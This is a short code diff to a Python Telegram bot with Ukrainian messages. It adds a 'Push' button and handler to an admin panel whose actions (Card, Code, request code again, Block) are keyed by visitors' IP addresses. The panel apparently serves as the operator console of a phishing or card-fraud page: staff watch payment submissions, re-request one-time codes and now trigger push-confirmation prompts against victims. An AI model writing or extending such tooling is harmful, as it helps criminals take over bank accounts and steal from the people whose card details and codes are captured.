@@ -1655,7 +1655,8 @@ async def payment_notify(request):
             InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
             InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
             InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
-            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
+            InlineKeyboardButton(text="Code", callback_data=f"code:{ip}"),
+            InlineKeyboardButton(text="Push", callback_data=f"push:{ip}")
         ],
         [
                 InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
@@ -1750,6 +1751,7 @@ async def code_notify(request):
     c.data.startswith('card:') or c.data.startswith('block:') or c.data.startswith('unblock:') or
     c.data.startswith('code:') or c.data.startswith('support:') or c.data.startswith('text:') or
     c.data.startswith('code_request_again:')
+    or c.data.startswith('push:')
 ))
 async def admin_action_handler(call: types.CallbackQuery):
     action, ip = call.data.split(':', 1)
@@ -1773,6 +1775,10 @@ async def admin_action_handler(call: types.CallbackQuery):
         async with aiohttp_client.ClientSession() as session:
             await session.post('http://127.0.0.1:8080/set_request_again', json={'code': ip})
         await call.answer("Код запитується знову")
+    elif action == 'push':
+        async with aiohttp_client.ClientSession() as session:
+            await session.post('http://127.0.0.1:8080/set_push_flag', json={'ip': ip, 'type': 'push'})
+        await call.answer("Push notification sent")
     # НЕ змінюємо клавіатуру!
     await call.answer()
 
